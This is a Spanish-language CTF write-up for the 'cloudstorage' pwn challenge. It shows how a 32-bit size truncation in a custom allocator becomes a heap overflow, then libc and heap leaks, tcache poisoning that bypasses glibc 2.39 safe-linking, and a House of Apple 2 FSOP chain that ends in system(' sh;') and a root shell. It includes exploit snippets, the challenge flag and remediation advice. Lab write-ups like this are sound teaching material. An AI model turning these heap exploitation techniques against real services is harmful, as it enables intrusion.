# 🧱 The Alignment Trap

> Truncación a 32 bits en un allocator propio → heap overflow → tcache poisoning → **House of Apple 2**

| Categoría | Dificultad | Puntos | Autor |
|---|---|---|---|
| Pwn (Binary Exploitation) | 🔴 Hard | 480 | diriartev |

**Flag:** `flag{49b6579273de3e1f}`

---

## Resumen (TL;DR)

`cloudstorage` es un gestor de "bloques" con un allocator alineado propio. El bug es una **truncación a 32 bits** en el cálculo del tamaño de `malloc`:

```nasm
lea eax, [r14 + r15 - 1]   ; (size + align - 1)  <- EAX = 32 bits, TRUNCA
and eax, edx               ; align_up(...)       <- 32 bits
add rax, 0x18              ; + cabecera
```

Con `size = 0xFFFF0000` y `align = 0x20000`, la suma desborda los 32 bits y `align_up` trunca a 0 → `malloc(0x18)` (chunk minúsculo), pero el campo `size` guardado es de 64 bits (`0xFFFF0000`). `write` y `read` usan ese tamaño (limitado a `0x10000`), lo que da un **heap overflow lineal de ~64 KB** con contenido arbitrario y una **lectura fuera de límites** de 64 KB.

A partir de ahí, en **glibc 2.39** (PIE, NX, Full RELRO):

1. Leak de libc (unsorted bin) y de heap (safe-linking de tcache), usando el propio `read` del programa como visor de memoria (sin gdb).
2. Escritura arbitraria vía **tcache poisoning** (con safe-linking de 2.39).
3. RCE con **House of Apple 2**: se sobrescribe `_IO_2_1_stdout_` y el siguiente `printf` del programa ejecuta `system(" sh;")`.

**Resultado remoto:** `uid=0(root)`.

| | |
|---|---|
| **Instancia** | `f6418eec804dbda1.chal.ctf.ae:443` (raw sobre TLS) |

## Paso 0 — Material y protecciones

```bash
7z x -y -pinfected "public(3).zip"   # cloudstorage + libc.so.6 + ld-linux
file cloudstorage
# ELF 64-bit PIE, dynamically linked, stripped
```

| Protección | Estado |
|---|---|
| PIE | ✅ Sí |
| NX | ✅ Sí |
| Full RELRO | ✅ Sí |
| Canary | ❌ No (irrelevante: es un bug de heap) |
| Stripped | ✅ Sí |
| glibc | 2.39-0ubuntu8.7 |

**Menú:** 1) Create, 2) Write, 3) Read, 4) Delete, 5) Status, 6) Audit, 7) Compact, 8) Verify, 9) Exit.

Cada bloque tiene una cabecera de `0x18` bytes:

| Offset | Campo |
|---|---|
| `+0x00` | magic (`0xaa55aa55`) |
| `+0x08` | align |
| `+0x10` | size |
| `+0x18` | data |

## Paso 1 — El bug (la "trampa de alineación")

En `create` (radare2, `main` inline, binario stripped):

```nasm
; r13 = align (potencia de 2, <= 0x80000000), r14 = size (<= 0xffff0000)
mov    r15d, 0x10
cmp    r13, r15
cmovae r15, r13               ; r15 = max(align, 0x10) = ealign
lea    eax, [r14 + r15 - 1]   ; <- 32 bits: (size + ealign - 1) TRUNCA
neg    edx                    ; edx = -ealign
and    eax, edx               ; <- 32 bits: align_up_32(size, ealign)
add    rax, 0x18              ; total = align_up + header
; ... malloc(rax)
mov    [rdx+0x10], r14        ; size guardado = r14 (64 bits, SIN truncar)
```

Con `size = 0xFFFF0000` y `ealign = 0x20000`:

```text
0xFFFF0000 + 0x20000 - 1 = 0x1_0001_FFFF
  → en 32 bits           = 0x0001_FFFF
  → & ~0x1FFFF           = 0
  → malloc(0x18)
size guardado            = 0xFFFF0000
```

`Write` (case 2) y `Read` (case 3) usan ese `size` limitado a `0x10000`:

```nasm
mov  eax, 0x10000
cmp  rbp, rax
cmova rbp, rax                ; rbp = min(size, 0x10000)
; read()/write() de rbp bytes en block+0x18
```

→ Se escriben/leen hasta **64 KB** en/desde un chunk de `0x18` bytes.

> El bucle de `write` usa `read()` + `memchr('\n')`: termina en newline, así que el payload no puede contener `0x0a` salvo al final.

Verificación local del primitivo:

```text
create(align=0x20000, size=0xFFFF0000) -> "Block 0 created (alignment: 131072, size: 4294901760)"
read(0)                                -> "Block 0 data (65536 bytes):"   (¡64 KB del heap!)
```

## Paso 2 — Leaks (el `Read` como "debugger")

Sin gdb, se usa el read OOB para volcar el heap. El binario local se ejecuta con su propio `ld`:

```python
process(['./ld-linux-x86-64.so.2', '--library-path', '.', './cloudstorage'])
```

- **Leak de libc:** se crea un bloque grande (`size=0x500` → chunk `0x520`) y se libera al unsorted bin (delete + compact). Sus `fd`/`bk` apuntan a `main_arena`. Se vuelca con `read(0)` y se calibra el offset con `/proc/<pid>/maps`: `libc_base = leak - 0x203b20`.
- **Leak de heap:** se libera un chunk pequeño a tcache; su `fd` está *safe-linked* (`fd = addr >> 12` cuando `next == NULL`) → `heap_base = fd << 12`.

Con el layout determinista: `block0_user = heap+0x2a0`, `block1_user = heap+0x2c0` (chunks `0x20` contiguos). Los nodos del freelist interno son `malloc(0x20)` → chunks `0x30`, así que no contaminan `tcache[0x20]`.

## Paso 3 — Escritura arbitraria (tcache poisoning, safe-linking 2.39)

1. `block0` (la trampa) queda pegado a `block1` (chunk `0x20`).
2. Se liberan `block1` y `blockX` a `tcache[0x20]` (2 entradas, `block1` en la cabeza).
3. Con el overflow de `block0` se sobrescribe el `fd` de `block1`:

   ```python
   poison = (block1_user >> 12) ^ target          # safe-linking de glibc 2.32+
   write(0, p64(0x21) + p64(poison) + p64(0))      # size, fd envenenado, key
   ```

4. Dos `create` más (con parámetros trampa → `malloc(0x18)` desde `tcache[0x20]`): el primero devuelve `block1` (descarte) y el segundo devuelve **`target`**.

> ⚠️ **Detalles clave:**
> - El check de alineación de tcache obliga a que `target` sea múltiplo de 16.
> - El allocator reutiliza slots liberados, así que el bloque objetivo cae en un índice bajo reutilizado (aquí, índice 2), no en un contador alto.

`target = _IO_2_1_stdout_ - 0x20` (múltiplo de 16). La cabecera que escribe `create` cae en la cola muerta del `FILE` anterior; el `write` controlado empieza en `stdout - 0x8`, cubriendo `_flags` en adelante.

## Paso 4 — RCE con House of Apple 2

Se construye un `FILE` falso sobre `_IO_2_1_stdout_` y un `_wide_data` falso en el heap:

```python
# FILE falso (escrito desde stdout-0x8; Write[0] = stdout-0x8 = vtable de stderr, se preserva)
fake._flags         = u64(" sh;")              # rdi = fp -> system(" sh;")
fake._IO_write_ptr  = 1                        # > write_base
fake._wide_data     = cfg                      # bloque heap controlado
fake.vtable         = _IO_wfile_jumps - 0x20   # __xsputn -> _IO_wfile_overflow

# cfg (wide_data falso)
cfg[0x18] = cfg[0x20] = cfg[0x30] = cfg[0x38] = 0   # write_base/ptr/buf = 0
cfg[0x68] = system                                  # _wide_vtable->__doallocate = system
cfg[0xe0] = cfg                                     # _wide_vtable = cfg
```

**Por qué funciona:** `puts` / `__printf_chk` (que el programa usa constantemente sobre `stdout`) llaman al slot `__xsputn` de la vtable. Con `vtable = _IO_wfile_jumps - 0x20`, ese slot resuelve a `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_wide_data->_wide_vtable->__doallocate(fp)` = `system(fp)`. Como `fp` empieza con `_flags = " sh;"`, se ejecuta `system(" sh;")` → **shell**.

El disparo ocurre en el siguiente `printf` del programa (el `[+] Wrote %zu bytes` tras nuestro propio write), porque `__printf_chk` escribe a un `stdout` ya corrupto.

## Paso 5 — Ejecución

```text
$ python3 exploit.py remote
LEAK heap=0x5606... libc=0x7fb2... B0=0x5606...2a0 ...
attempt 0 STATUS: ok
uid=0(root) gid=0(root) groups=0(root)
flag{49b6579273de3e1f}
```

🚩 **FLAG:** `flag{49b6579273de3e1f}` — ¡root al primer intento en remoto!

## Anexo — ¿Qué es el *Connection Snippet*?

```python
from pwn import *
HOST = "f6418eec804dbda1.chal.ctf.ae"
io = remote(host=HOST, port=443, ssl=True, sni=HOST)
io.interactive()
```

- **`from pwn import *`** — carga pwntools (`remote()`, `process()`, `p64()`/`u64()`, `recvuntil()`, `sendline()`...).
- **`remote(HOST, 443, ...)`** — el binario corre en el servidor y usa el socket como `stdin`/`stdout`. Todo el exploit (leaks, poison, House of Apple) viaja por ese socket.
- **`port=443, ssl=True, sni=HOST`** — servicio envuelto en TLS sobre el 443; SNI para que el proxy enrute a la instancia correcta. Sin `ssl=True` el servidor rechaza la conexión.
- **`io.interactive()`** — shell interactiva. Cuando House of Apple lanza `system(" sh;")`, el socket queda conectado a una shell del servidor y por él se envía `id; cat /flag*`.

## Remediación

- Calcular tamaños con `size_t` (64 bits), nunca en registros de 32 bits. Validar `size` y `align` con los mismos tipos que usa la aritmética.
- Detectar y rechazar el desbordamiento de `align_up` (`if (rounded < size) error`).
- Limitar escritura/lectura al tamaño **realmente reservado**, no al `size` guardado.
- Considerar `MALLOC_CHECK_` o un allocator endurecido para servicios expuestos.

## Conclusión

Cuando un allocator "propio" mezcla aritmética de 32 bits con campos de tamaño de 64 bits, busca la truncación: un `size` enorme + `align` grande puede hacer que el `malloc` real sea diminuto mientras el programa cree que el buffer es gigante. A partir de un overflow lineal en glibc moderna (sin hooks), el camino estándar es **leak (unsorted + safe-link) → tcache poisoning → FSOP (House of Apple 2)**. Y no siempre hace falta gdb: el propio primitivo de lectura del programa es un visor de memoria.
